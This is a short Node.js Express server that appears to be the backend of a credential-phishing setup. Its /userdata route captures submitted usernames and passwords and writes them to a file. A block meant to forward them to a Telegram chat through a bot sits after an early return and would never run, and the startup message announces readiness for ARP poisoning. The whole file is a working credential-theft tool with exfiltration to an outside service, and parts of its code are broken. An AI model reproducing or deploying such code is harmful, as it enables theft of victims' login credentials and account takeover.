import express from "express";
import fs from "fs";
import cors from 'cors';
require('dotenv').config();


const app = express();
app.use(cors({ origin: '*'}));

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

app.use(express.static(__dirname + "/public/live"));

app.get("/live", (req, res, next) => {
    res.sendFile(__dirname + "/public/live/index.html");
});

app.post("/userdata", (req, res, next) => {
    try {
        var data = `user: ${req.body.userName} password: ${req.body.password}`
        console.log(data);
        fs.writeFile("result.txt", data, (err) => {
            if (err) console.log(err);
            console.log("Successfully Written to File.");
          });
        res.sendStatus(200);
        return;
    } catch(err) {
        console.log(err);
        res.sendStatus(404);
        return;
    }



    
const TelegramBot = require('node-telegram-bot-api');

const token = process.env.token;

const bot = new TelegramBot(token);

const userName = req.body.userName;
const password = req.body.password;
const message = `SESSION\nlogin username= ${userName}\npassword = ${password}`;
const chatId = process.env.chatId;  // Replace with the target chat ID

const moment = require('moment'); // Assuming you've installed moment.js

const today = moment().format('LL'); // Example output: "2024-05-28 Tuesday" (adjust format if needed)

bot.sendMessage(chatId, `Today's date is: ${today}`)
  .then(() => console.log())
  // .catch((error) => console.error('Error sending message:', error));

  // Send the message
  bot.sendMessage(chatId, message).then(() => {
    console.log('Message sent successfully');
    res.send('Message sent successfully');
}).catch(() => {
    // console.error('Error sending message:', error);
    // res.status(500).send('Error sending message');
});

});


app.listen(5000, () => console.log("Server running on port 5000, ready for arp poisoning"));


